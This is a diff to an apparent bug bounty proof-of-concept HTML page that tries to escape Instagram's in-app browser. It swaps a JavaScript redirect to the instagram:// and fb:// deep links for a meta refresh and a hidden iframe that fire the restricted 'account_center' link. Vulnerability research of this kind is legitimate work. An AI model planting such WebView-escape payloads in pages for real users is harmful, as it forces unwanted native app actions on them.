@@ -1,21 +1,12 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Meta Bug Bounty PoC</title>
+    <!-- Use Meta Refresh to auto-redirect the browser to the native scheme -->
+    <meta http-equiv="refresh" content="1;url=instagram://account_center">
 </head>
 <body>
-    <h1>Attempting WebView Escape...</h1>
-    <script>
-        // Once the Instagram In-App Browser loads this page, 
-        // we use JavaScript to attempt to fire the restricted native deep link.
-        setTimeout(function() {
-            window.location.href = "instagram://account_center";
-        }, 1000);
-        
-        // Fallback to the Facebook Canary just in case
-        setTimeout(function() {
-            window.location.href = "fb://avatar";
-        }, 2500);
-    </script>
+    <h1>Testing Meta Refresh Escape...</h1>
+    <!-- iframe injection attempt -->
+    <iframe src="instagram://account_center" style="display:none;"></iframe>
 </body>
 </html>
